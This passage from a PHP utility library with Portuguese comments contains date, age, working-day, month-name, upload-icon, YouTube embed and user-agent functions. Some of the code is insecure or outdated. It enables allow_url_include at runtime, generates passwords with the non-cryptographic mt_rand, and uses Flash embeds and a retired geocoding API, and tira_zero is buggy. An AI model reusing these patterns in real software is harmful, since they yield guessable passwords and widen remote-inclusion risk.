		//conta dia
		if($time_cont >= "86400"){
			$dias++;
			$time_cont = $time_cont-86400;
		}//fim if conta dia
		
		//conta horas
		if(($time_cont < "86400") and ($time_cont >= "3600")){
			$horas++;
			$time_cont = $time_cont-3600;
		}//fim if conta horas
		
		//conta minutos
		if(($time_cont < "3600") and ($time_cont >= "60")){
			$minutos++;
			$time_cont = $time_cont-60;
		}//fim if conta minutos
		
		//conta segundos
		if(($time_cont < "60") and ($time_cont > "0")){
			$segundos = $time_cont;
			$time_cont = "0";
		}//fim if conta segundos
			
		if($time_cont <= "0"){ break; }//para se alcançou o maximo
	}//fim while
	if($dias > "1"){ $dias_leg = "dias"; }else{ $dias_leg = "dia"; } 
	if($horas > "1"){ $horas_leg = "horas"; }else{ $horas_leg = "hora"; }
	if($minutos > "1"){ $minutos_leg = "minutos"; }else{ $minutos_leg = "minuto"; }
	if(($dias<="0") and ($horas<="0") and ($minutos<="0")){
		$var_r = "completado";
	}
	if($tipo == "1"){
		$var_r = "";
		if($dias != "0"){
			if($var_r != ""){ $var_r .= ", "; }
			$var_r .= "$dias $dias_leg";
		}
		if($horas != "0"){ 
			if($var_r != ""){ $var_r .= ", "; } 
			$var_r .= "$horas $horas_leg";
		}
		if($minutos != "0"){ 
			if($var_r != ""){ $var_r .= ", "; }
			$var_r .= "$minutos $minutos_leg";
		}
	}//fim tipo
	if($tipo == "2"){
		$var_r = "$dias $dias_leg - $horas:$minutosh";
	}//fim tipo
	}//fim else ja venceu
	return $var_r;
}//fim function contagem_datas(){











//funcao que traz a idade calcular_idade
/*
Exemplo de uso:
//insetir 22/09/1980
echo calcular_idade("22/09/1980");// 31
*/
function calcular_idade($nascimento,$adiciona='0') {
	if(preg_match("/-/", $nascimento)){ $nascimento = data_mysql($nascimento,0); }
	$hoje = date("d/m/Y"); //pega a data d ehoje
	$aniv = explode("/", $nascimento); //separa a data de nascimento em array, utilizando o símbolo de - como separador
	$atual = explode("/", $hoje); //separa a data de hoje em array
	$idade = $atual[2] - $aniv[2];
	if($aniv[1] > $atual[1]){//verifica se o mês de nascimento é maior que o mês atual
		$idade--; //tira um ano, já que ele não fez aniversário ainda
	}elseif($aniv[1] == $atual[1] && $aniv[0] > $atual[0]){ //verifica se o dia de hoje é maior que o dia do aniversário
		$idade--; //tira um ano se não fez aniversário ainda
	}
	if($idade <= "0"){ $idade = "0"; }
	if($adiciona == "1"){ $adiciona = $idade;
		if($adiciona == "0"){ $idade .= " ano"; }
		if($adiciona == "1"){ $idade .= " ano"; }
		if($adiciona >= "2"){ $idade .= " anos"; }
	}
	return $idade; //retorna a idade da pessoa em anos
}//fim funcao calcular_idade


/*
//FUNCAO BUSCA DADOS NO GOOGLE MAPS

*/
function get_googlemaps($dados, $retorno='cidade'){
	ini_set("allow_url_fopen", 1); 
	ini_set("allow_url_include", 1); 

	if($retorno == "cidade"){
		$request_url = 'http://maps.google.com/maps/geo?output=xml&q='.$dados;
		$xml = simplexml_load_file($request_url) or die("url nao carregada...");
		$status = $xml->Response->Status->code;
		if (strcmp($status, "200") == 0){
	
			// Successful geocode
	
		   $n_cidade = $xml->Response->Placemark->AddressDetails->Country->AdministrativeArea->Locality->LocalityName;
			echo utf8_decode($n_cidade);
		}
	}//fim if cidade
}//fim function get_googlemaps(){




//funcao que traz a diferenca de horas time difHoraTime
/*
Exemplo de uso:
//insetir time da data para calculo
echo difHoraTime(time()+3600);
*/
function difHoraTime($time_analizar, $time_dif='0',$ponteiro="1",$legenda_ax="atrás"){
	if(($time_analizar == "0") or ($time_analizar == "")){ $time_analizar = "0"; }
	if(($time_dif == "0") or ($time_dif == "")){ $time_dif = time(); }
	$imprime = "NUNCA";	
	if($time_analizar >= $time_dif){
		if($ponteiro == "1"){ $time_ponteiro = $time_analizar; }else{ $time_ponteiro = $time_dif; }
		$imprime = date('d/m/Y H:i',$time_ponteiro)."h";
		$time_analizar = "0";
	}
	if($time_analizar >= "10"){
		$oqueM = "0"; //variavel que define se mostra relogio ou data
		$horaT = date ('H:i',$time_analizar); // isso deverar imprimir 12:20. hora do time recebido
		$divisorM = 60; /* 60 é o total de segundos que existe em 1 minuto */
		$divisorH = 60; /* 60 é o total de minutos que existe em 1 hora */
		$divisorD = 24; /* 24 é o total de horas que existe em 1 dia */
		$divisorS = 7; /* 24 é o total de dias que existe em 1 semana */
		
		//calcula a diferenca dos valores e tranforma em MINUTOS
		$dif = $time_dif - $time_analizar;
		$result = (int)($dif / $divisorM); //converte para minutos e tira numeros decimais
	
		//verifica se e maior que uma hora
		if($result > "60"){
			//calcula a diferenca dos valores e tranforma em HORAS
			$result = (int)($result / $divisorH); //converte para horas e tira numeros decimais
			//verifica se e maior que 24 horas (um dia)
			if($result > "24"){
				//calcula a diferenca dos valores e tranforma em DIAS
				$result = (int)($result / $divisorD); //converte para dias e tira numeros decimais
				//verifica se e maior que 7 dias
				if($result > "7"){
					//calcula a diferenca dos valores e tranforma em SEMANAS
					$result = (int)($result / $divisorS); //converte para semanas e tira numeros decimais
					if($result > "3"){
						$imprime = "";
					}else{
						$imprime = $result." semanas(s) ".$legenda_ax;
						$oqueM = "1";
					}
				}else{
					$imprime = $result." dia(s) ".$legenda_ax;
					$oqueM = "1";
				}
			}else{
				$imprime = $result." hora(s) ".$legenda_ax;
				$oqueM = "0";
			}
		}else{
			$imprime = $result." minuto(s) ".$legenda_ax;
			$oqueM = "0";
		}
		$imprime_ = $imprime;
		//monta o retorno do valor
		if($ponteiro == "1"){ $time_ponteiro = $time_analizar; }else{ $time_ponteiro = $time_dif; }
		$diaTime = date ('d',$time_ponteiro); // isso deverar imprimir 25-12-2003.
		$mesTime = date ('m',$time_ponteiro); // isso deverar imprimir 25-12-2003.
		$mesTime = nome_mes($mesTime, "2");
		$anoTime = date ('Y',$time_ponteiro); // isso deverar imprimir 25-12-2003.
		$aano = date('Y'); //busca o ano atual
		if($aano == $anoTime){ $anoTime =""; } //se o ano for igual aao atual limpa a variavel
		if($imprime == ""){
			$imprime = "$diaTime $mesTime $anoTime";
		}else{ //if($difTime == "")
			if($oqueM == "0"){ //mostra hora
				$imprime = $horaT."h (".$imprime.")";
			}else{ //mostra data
				$imprime = "$diaTime $mesTime $anoTime (".$imprime.")";
			}//fim mostra data
			if($ponteiro == "tempo"){ $imprime = $imprime_; }
		}//fim else if($difTime == "")
	}//if(($time_analizar >= "10")){
	return $imprime;
}// FIM da funcao que traz a diferenca de horas time difHoraTime




//função conversão de segundos em horas
function sgundosHorasLeg($total,$divisor=", ",$tipo="full"){
	$retorno = "0"; $horas = 0; $minutos = 0; $segundos = 0;
	$horas = floor($total / 3600);
	$minutos = floor(($total - ($horas * 3600)) / 60);
	if($tipo == "resumo"){ }else{
		$segundos = floor($total % 60);
	}
	if($horas >= "1"){
		if($retorno == "0"){ $retorno = ""; }
		if($retorno != ""){ $retorno .= $divisor; }
		$retorno .= $horas."h";
	}
	if($minutos >= "1"){
		if($retorno == "0"){ $retorno = ""; }
		if($retorno != ""){ $retorno .= $divisor; }
		$retorno .= $minutos."min";
	}
	if($segundos >= "1"){
		if($retorno == "0"){ $retorno = ""; }
		if($retorno != ""){ $retorno .= $divisor; }
		$retorno .= $segundos."s";
	}	
	return $retorno;
}// FIM sgundosHorasLeg





//Exemplo de uso
//diasemana("13/07/2007"); ou diasemana("2007-07-13");
function diasemana($data,$tipo='2') {
	if(preg_match("/\//i", $data)){
		$d = explode("/",$data);
		$ano =  $d["2"];
		$mes =  $d["1"];
		$dia =  $d["0"];
	}else{
		$d = explode("-",$data);
		$ano =  $d["0"];
		$mes =  $d["1"];
		$dia =  $d["2"];		
	}
	$diasemana = date("w", mktime(0,0,0,$mes,$dia,$ano) );
	return nome_diasemana($diasemana,$tipo);
}//diasemana





//Exemplo de uso
//diaUtil("13/07/2007"); ou diaUtil("2007-07-13"); retorna o próximo dia util 
function diaUtil($data) {
	$dias = "0"; $formato = "";
	if(preg_match("/\//i", $data)){
		$d = explode("/",$data);
		$ano =  $d["2"];
		$mes =  $d["1"];
		$dia =  $d["0"];
		$formato = '/';
	}else{
		$d = explode("-",$data);
		$ano =  $d["0"];
		$mes =  $d["1"];
		$dia =  $d["2"];		
	}
	$diasemana = date("w", mktime(0,0,0,$mes,$dia,$ano));
	if($diasemana == "6"){ $dias = "2"; }//sábado
	if($diasemana == "0"){ $dias = "1"; }//domingo
	if($dias >= "1"){
		if($formato == '/'){
			$data_ret = date('d/m/Y', strtotime("+".$dias." days",strtotime($dia.'-'.$mes.'-'.$ano)));
		}else{
			$data_ret = date('Y-m-d', strtotime("+".$dias." days",strtotime($dia.'-'.$mes.'-'.$ano)));
		}
	}else{ $data_ret = $data; }//if($dias >= "1"){
	return $data_ret;
}//diaUtil



//busca o nome do dia da semana com recebimento do numero
//exemplo: $dia_semana = $dias[date("w")];
function nome_diasemana($dia_semana="",$tipo='1',$php='0'){
	if($dia_semana == ""){ $dia_semana = date('w'); if($dia_semana >= "7"){ $dia_semana = "0"; } }//pega dia atual
	//Dia da semana date('w'); 0 (para domingo) até 6 (para sábado)
	//verifica se e uma data PHP -> 1 (para Segunda) até 7 (para Domingo) date('N');
	if($php == "1"){
		if($dia_semana == "8"){ $dia_semana = "1"; }
	}
	if($php == "2"){ $dia_semana--; }
	
	if($tipo == "2"){
		$dias=array("Domingo","Segunda","Terça","Quarta","Quinta","Sexta","Sábado");
	}else{
		if($tipo == "3"){
			$dias=array("DOM","SEG","TER","QUA","QUI","SEX","SAB");
		}else{
			$dias=array("Domingo","Segunda-feira","Terça-feira","Quarta-feira","Quinta-feira","Sexta-feira","Sábado");
		}
	}
	$dia_s = $dias["$dia_semana"];
	return $dia_s;
}//fim //busca o nome do dia da semana com recebimento do numero


//busca o nome do nome do mes pelo numero
//exemplo: $dia_semana 
/*
Exemplo de uso:
//insetir o numero do mes
echo nome_mes('9', '0');
*/
function nome_mes($n_mes, $tipo = '0'){
	$n_mes = tira_zero($n_mes);
	$meses=array("","janeiro","fevereiro","março","abril","maio","junho","julho","agosto","setembro","outubro","novembro","dezembro");
	$nome = $meses["$n_mes"];
	//verifica se coloca maiusculo
	if($tipo == "1"){ $nome = ucfirst($nome); }
	if($tipo == "2"){ $nome = substr($nome,0,3); }
	if($tipo == "3"){ $nome = ucfirst(substr($nome,0,3)); }
	return $nome;
}//fim //busca o nome do nome do mes pelo numero




//busca a data por extenso
//exemplo: 22 de setembro de 1981
/*
Exemplo de uso:
//insetir a data
echo nome_mes('22/09/1981');
*/
function nome_data($data, $tipo='0', $lay='0'){
	$d = explode("/", $data);
	$nome = $d[0]." de ".nome_mes($d[1], $tipo)." de ".$d[2];
	if($lay == "1"){ $nome = $d[0]." de ".nome_mes($d[1], $tipo)."/".$d[2]; }
	if($lay == "2"){ $nome = $d[0]."/".nome_mes($d[1], $tipo)."/".$d[2]; }
	if($lay == "mes"){ $nome = nome_mes($d[1], $tipo)." de ".$d[2]; }
	if($lay == "ano"){ $nome = " ANO ".$d[2]; }
	return $nome;
}//fim //busca o nome do nome do mes pelo numero



//funcao que retorna o numero de dias entre duas datas
/*
Exemplo de uso:
echo "VAR: ".retorna_dias("10/12/2011","20/12/2011");
//imprime: 10
*/
function retornaDias($data1, $data2='',$getWorkingDays="1"){
	if($data2== ""){ $data2 = date('d/m/Y'); }
	///data inicial
	$d = explode("/", $data1);
	$dia1 = $d[0]; // Dia 
	$mes1 = $d[1]; // Mês 
	$ano1 = $d[2]; // Ano
  
	///data final
	$d = explode("/", $data2);
	$dia2 = $d[0]; // Dia 
	$mes2 = $d[1]; // Mês 
	$ano2 = $d[2]; // Ano 
	
	//pega dias úteis
	if($getWorkingDays == "1"){
		$beginday = $ano1."-".$mes1."-".$dia1;
		$lastday = $ano2."-".$mes2."-".$dia2;
		$Dif = getWorkingDays($beginday, $lastday);
	}else{//if($getWorkingDays == "1"){
		//Armazena nas variáveis $DataInicial e $DataFinal
		//os valores de $DataI e $DataF no formato 'timestamp'
		$DataInicial = getdate(strtotime("$ano1/$mes1/$dia1"));
		$DataFinal = getdate(strtotime("$ano2/$mes2/$dia2"));
		// Calcula a Diferença
		$Dif = round (($DataFinal[0] - $DataInicial[0]) / 86400);
	}//else{//if($getWorkingDays == "1"){
	return $Dif;
}//fim da funcao de retorno de dias entra datas



/*Pegar dias úteis, sem sabado e domingo
$beginday = "2019-04-10"; $lastday = "2019-04-16";
echo "<br>RETORNO1: ".getWorkingDays($beginday, $lastday); // > 5
*/
function getWorkingDays($startDate, $endDate) {
    $begin = strtotime($startDate);
    $end   = strtotime($endDate);
    if ($begin > $end) {
        echo "startdate is in the future! <br />";
        return 0;
    }    else {
        $holidays = array();//('01/01', '25/12', ...);
        $weekends = 0;
        $no_days = 0;
        $holidayCount = 0;
        while ($begin <= $end) {
            $no_days++; // no of days in the given interval
            if (in_array(date("d/m", $begin), $holidays)) {
                $holidayCount++;
            }
            $what_day = date("N", $begin);
            if ($what_day > 5) { // 6 and 7 are weekend days
                $weekends++;
            };
            $begin += 86400; // +1 day
        };
        $working_days = $no_days - $weekends - $holidayCount;

        return $working_days;
    }
}//getWorkingDays






//funcao que retorna o ultimo dia do mes/ano
/*
Exemplo de uso:
echo "VAR: ".ultimoDiaMes("13/8/2011");
ou
echo "VAR: ".ultimoDiaMes("8/2011");
ou
echo "VAR: ".ultimoDiaMes("8","2011");
//imprime: 31
*/
function ultimoDiaMes($mes,$ano=""){	
	if(preg_match("/\//i", $mes)){
		$d = explode("/",$mes);
		if(isset($d["2"])){
			$mes = $d["1"]; $ano = $d["2"];
		}else{
			$mes = $d["0"]; $ano = $d["1"];
		}
	}
	$num = cal_days_in_month(CAL_GREGORIAN, $mes, $ano); // funcao manual php
	return $num;
}//fim funcrion ultimoDiaMes($mes, $ano){








//funcao que adiciona meses em uma data
/*
Exemplo de uso:
echo "VAR: ".addMes("13/8/2011","1");
//imprime: 13/9/2011 */
function addMes($data,$mesQtd="1"){	
	$d = explode("/",$data);
	$cont = "0";
	while($cont < $mesQtd){ $cont++;
		$d["1"]++;
		if($d["1"] > "12"){ $d["1"] = "1"; $d["2"]++; }
	}//while
	$uDia = ultimoDiaMes($d["1"],$d["2"]);
	if($d["0"] > $uDia){ $d["0"] = $uDia; }
	return completa_zero($d["0"])."/".completa_zero($d["1"])."/".$d["2"];
}//fim addMes
	
	
	
	
	
	
//funcao que retorna o ip do HOST
/*
Exemplo de uso:
echo "VAR: ".retorna_ip();
//imprime: 200.12.13.12
*/
function retorna_ip(){
	$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	return $host;
}//fim funcrion retorna_ip(){




//função para gerar senhas
/*
Exemplo de uso:
echo "VAR: ".geraSenha("8");
//imprime: SENHA 8 DIGITOS
*/
function geraSenha($tamanho = 8, $numeros = true, $maiusculas = false, $simbolos = false){
	// Caracteres de cada tipo
	$lmin = 'abcdefghijklmnopqrstuvwxyz';
	$lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$num = '1234567890';
	$simb = '!@#$%*-';
	
	// Variáveis internas
	$retorno = '';
	$caracteres = '';
	
	// Agrupamos todos os caracteres que poderão ser utilizados
	$caracteres .= $lmin;
	if ($maiusculas) $caracteres .= $lmai;
	if ($numeros) $caracteres .= $num;
	if ($simbolos) $caracteres .= $simb;
	
	// Calculamos o total de caracteres possíveis
	$len = strlen($caracteres);
	
	for ($n = 1; $n <= $tamanho; $n++) {
		// Criamos um número aleatório de 1 até $len para pegar um dos caracteres
		$rand = mt_rand(1, $len);
		// Concatenamos um dos caracteres na variável $retorno
		$retorno .= $caracteres[$rand-1];
	}
	return $retorno;
}//fim geraSenha


//funcao que insere zero a esquerda - echo completa_zero($var);
/*
Exemplo de uso:
$var = "1";
echo "VAR: ".completa_zero($var,'2');
//imprime: 01
*/
function completa_zero($var, $zeros='2'){
	$var = str_pad($var, $zeros, "0", STR_PAD_LEFT);
	return $var;
}//fim da funcao que insere zero a esquerda

//funcao que tira a esquerda - echo tira_zero($var);
function tira_zero($var){
	$var = str_replace("01", "1", $var);
	$var = str_replace("02", "2", $var);
	$var = str_replace("03", "3", $var);
	$var = str_replace("04", "4", $var);
	$var = str_replace("05", "5", $var);
	$var = str_replace("06", "6", $var);
	$var = str_replace("07", "7", $var);
	$var = str_replace("08", "8", $var);
	$var = str_replace("09", "9", $var);
	return $var;
}//fim da funcao que insere zero a esquerda


//prepara conteudo para montagem de arquivos SDF (Sistema de Dados Faisher)
/* Exemplo de USO: *retira as TAGS para montagem de arquivos SDF
$var = "Conteudo";
echo cod_SDF($var);
*/
function tags_SDF($var){
	$var = str_replace("[/l/]", "[/ l /]", $var);
	$var = str_replace("[/c/]", "[/ c /]", $var);
	$var = str_replace("[/cs/]", "[/ cs /]", $var);
	$var = str_replace("[/d/]", "[/ d /]", $var);
	return $var;
}//fim da funcao cod_SDF





//monta tamanho de imagem
function proporcaoImagem($imagem,$tmw){
	$tamFULL = getimagesize("$imagem");
	$TM["w"] = (int)$tamFULL[0];
	//$TM["h"] = (int)$tamFULL[1];
	if($TM["w"] > $tmw){ $TM["w"] = $tmw; }
	return $TM;
}//fim proporcaoImagem



//monta imformação LIMIT para SQL
function limitSQL($limit,$max="30"){
	$l = explode(",", $limit);//"0,30"
	//ponteiro de dados
	if($l["0"] >= "0"){
		if($l["0"] > $max){ $l["0"] = $max; }
	}else{ $l["0"] = "0"; } 
	//quantidade de linhas	
	if($l["1"] >= "1"){
		if($l["1"] > $max){ $l["1"] = $max; }
	}else{ $l["1"] = "1"; } 
	return $l["0"].",".$l["1"];
}//limitSQL





//INICIO FUNÇÕES DE PÁGINAS/CÓDIGOS --------++++++++++++++++++++++++++++++++++++++>>>

//Função monta o icone de upload
/*
Exempplode USO:
$nome = "imagem.jpg";
$caminho_file = "uploads/temp/";//caminho para buscat o thumb
echo mostra_ico_upload($nome, $caminho_file);
*/
//mostra_ico_upload($nome, $caminho_file)
function mostra_ico_upload($nome, $caminho_file, $file_thumb='../', $solicita_tipo='login'){
		//busca a ICO
		//se for DOC gera thumb de exibicao
		$extensoes_doc = array(".doc", ".docx", ".rtf", ".txt", ".odt");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_doc.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_doc.png"; }
		}


		//se for POWERPOINT gera thumb de exibicao
		$extensoes_doc = array(".ppsx", ".pptx", ".pps", ".ppt", ".odp");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_ppt.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_ppt.png"; }
		}
		
		
		//se for EXEL gera thumb de exibicao
		$extensoes_doc = array(".xls", ".xlsx", ".ods");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_xls.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_xls.png"; }
		}
		
		
		//se for PDF gera thumb de exibicao
		$extensoes_doc = array(".pdf");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_pdf.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_pdf.png"; }
		}
		
		
		//se for ZIP gera thumb de exibicao
		$extensoes_doc = array(".zip");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_zip.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_zip.png"; }
		}
		
		
		//se for RAR gera thumb de exibicao
		$extensoes_doc = array(".rar");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_rar.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_rar.png"; }
		}
		
		//se for VIDEO gera thumb de exibicao
		$extensoes_doc = array(".flv", ".mp4");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_video.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_video.png"; }
		}
		
		//se for MP3 gera thumb de exibicao
		$extensoes_doc = array(".mp3");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_mp3.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_mp3.png"; }
		}
		
		//se for CDR COREL gera thumb de exibicao
		$extensoes_doc = array(".cdr");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_cdr.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_cdr.png"; }
		}
		
		
		//se for AI ILUSTRATOR gera thumb de exibicao
		$extensoes_doc = array(".ai");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_ai.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#999 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_ai.png"; }
		}
		
		
		//se for PSD PHOTOSHOP gera thumb de exibicao
		$extensoes_doc = array(".psd");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_doc)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher("admin/img/file_icons/ico_psd.png", "enc")."&w=58&h=58\" width=\"58\" height=\"58\" style=\"padding:1px; border:#FFF 1px solid;\" />";
			if($file_thumb == "RETORNAURL"){ $imagem_exib = "admin/img/file_icons/ico_psd.png"; }
		}
		
		
		//se for imagem gera thumb de exibicao
		$extensoes_img = array(".gif", ".png", ".jpg", ".jpeg");
		if(in_array(strtolower(strrchr($nome, ".")), $extensoes_img)){
			$imagem_exib = "<img src=\"".$file_thumb."img.php?imagem=".cripto_faisher($caminho_file.$nome, "enc")."&w=58&h=58&".rand(9,9999)."\" width=\"58\" height=\"58\" style=\"padding:1px; border:#FFF 1px solid;\" />";
			
			//verifica se é uma solicitação externa
			if($solicita_tipo == "usuarios_msg"){
				$imagem_exib = "<img src=\"".$file_thumb."img.php?usuarios_msg=".cripto_faisher($caminho_file, "enc")."&imagem=".cripto_faisher($nome, "enc")."&w=58&h=58&".rand(9,9999)."\" width=\"58\" height=\"58\" style=\"padding:1px; border:#FFF 1px solid;\" />";
			}//fim if($solicita_tipo == "usuarios_msg"){
			if($file_thumb == "RETORNAURL"){ $imagem_exib = $caminho_file.$nome; }
		}
		return $imagem_exib;//retorna o valor
}//fim mostra_ico_upload($nome, $caminho_file);






//funções para YOUTUBE - prepara video para anable e thumbs
function preparaVideo($url){
	$url = str_replace("feature=player_embedded&","",$url);
	$url = str_replace("feature=player_embedde&","",$url);
	$url = str_replace("&feature=g-vrec","",$url);
	return $url;
}//fim prepara youtube


//funções para YOUTUBE - anable e thumbs
function embedVideo($url,$width,$height,$autoplay='0'){
   /*
    * RETORNA VIDEOS DO YOUTUBE E METACAFE
    *
    * É POSSÍVEL IMPLEMENTAR MAIS EXPRESSÕES REGULARES
    *
    * é possível adaptar um retorno em string também,
    * aí fica a critério de quem usar a função
    *
    */
 	if($autoplay != "0"){ $autoplay = "&autoplay=1"; }
   if(preg_match("#http://(.*)\.youtube\.com/watch\?v=(.*)(&(.*))?#", $url, $matches)){
      return '
            <object style="width:'.$width.'; height:'.$height.';">
               <param name="movie" value="http://www.youtube.com/v/'.$matches[2].'&hl=pt-br&fs=1&rel=0&autoplay='.$autoplay.'"></param>
               <param name="allowFullScreen" value="true"></param>
               <param name="allowscriptaccess" value="always"></param>
               <embed src="http://www.youtube.com/v/'.$matches[2].'&hl=pt-br&fs=1&rel=0'.$autoplay.'" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true"  style="width:'.$width.'; height:'.$height.';"></embed>
            </object>
            ';
   }elseif(preg_match("#http://www\.metacafe\.com/watch/(([^/].*)/([^/].*))/?#", $url, $matches)){
      return '<embed flashVars="playerVars=showStats=no|autoPlay=no|videoTitle="  src="http://www.metacafe.com/fplayer/'.$matches[1].'.swf" width="'.str_replace('%',"",$width).'" height="'.str_replace('%',"",$height).'" wmode="transparent" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash"></embed>';
   }
}

//exemplo
//$youtubeVideo1 = 'http://in.youtube.com/watch?v=Km7PcdMzaN4';
//$youtubeVideo2 = 'http://in.youtube.com/watch?v=xNi7QwAL3XY&feature=dir';
//$metacafeVideo1 = 'http://www.metacafe.com/watch/2215104/amazing_video/';
//$metacafeVideo2 = 'http://www.metacafe.com/watch/2204556/sensational_cars_of_the_future/';
 
//embedVideo($youtubeVideo1,425,344);
//embedVideo($youtubeVideo2,425,344);
//embedVideo($metacafeVideo1,400,348);
//embedVideo($metacafeVideo2,400,348);
 //$tm='' hq
 //$time='1', 2, 3, 4
function youtubeImage($url,$tipo='src',$tm='',$time='1') {
   $img = '';
   // O TAMANHO PADRAO DA IMAGEM DO YOUTUBE É 120x90
   if(preg_match("#http://(.*)\.youtube\.com/watch\?v=(.*)(&(.*))?#", $url, $matches)){
      if(isset($matches[2]) && $matches[2]!=''){
         //$img = 'http://i'.$time.'.ytimg.youtube.com/vi/'.$matches[2].'/'.$tm.'default.jpg';//'/default.jpg';
         $img = 'http://img.youtube.com/vi/'.$matches[2].'/'.$tm.'default.jpg';//'/default.jpg';
      }
   }
   return $tipo=='src' ? $img : '<img src="'.$img.'" border="0" />';
}

//exemplo
//echo youtubeImage($youtubeVideo1,'img', '1');






//funções só para YOUTUBE
/*Exemplo:
echo embedYoutube("http://www.youtube.com/watch?v=OzHvVoUGTOM&feature=channel",'width:100%; height:200px;');
echo embedYoutube("https://youtu.be/mGLdTOppzHo",'width:100%; height:200px;');*/
function embedYoutube($url,$style,$controls='',$autoplay='0',$showinfo='0'){
	$yCode = "";
	$getUrl = "rel=0&";
	if($controls != ""){ $getUrl .= 'controls='.$controls.'&'; }
	if($autoplay != ""){ $getUrl .= 'autoplay='.$autoplay.'&'; }
	if($showinfo != ""){ $getUrl .= 'showinfo='.$showinfo.'&'; }
	preg_match('/[\\?\\&]v=([^\\?\\&]+)/',$url,$matches); $yCode = $matches[1];
	if($yCode == ""){ $yCode = strrchr($url, '/'); }
	if($style == "URL"){
		$retorno = 'https://www.youtube.com/embed/'.$yCode.'?'.$getUrl;
	}else{
		$retorno = '<iframe type="text/html" class="css-youtube" style="'.$style.'" src="https://www.youtube.com/embed/'.$yCode.'?'.$getUrl.'" frameborder="0" allowfullscreen></iframe>';
	}
	if($style == "CODE"){ $retorno = $yCode; }
	return $retorno;
}//embedYoutube







/*
//Informa sistema operacional e faz filtro de versão!
Exemplo de USO:
echo "<br />Tipo: ".getOs();//mesa
echo "<br />Sistema: ".getOs('ON');//Windows 7
*/
function getOs($leg='off'){
	 $tipo_versao = "mesa"; //mesa, mobile
 	 $useragent = $_SERVER['HTTP_USER_AGENT'];
	 $useragent = strtolower($useragent);
	 
	 //check for (aaargh) most popular first
	 //winxp
	 if(strpos("$useragent","windows nt 5.1") !== false){
		 $tipo_versao_leg = "Windows XP";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","windows nt 6.0") !== false){
		 $tipo_versao_leg = "Windows Vista";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","windows nt 6.1") !== false){
		 $tipo_versao_leg = "Windows 7";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","windows 98") !== false){
		 $tipo_versao_leg = "Windows 98";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","windows nt 5.0") !== false){
		 return "Windows 2000";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","windows nt 5.2") !== false){
		 $tipo_versao_leg = "Windows 2003 server";
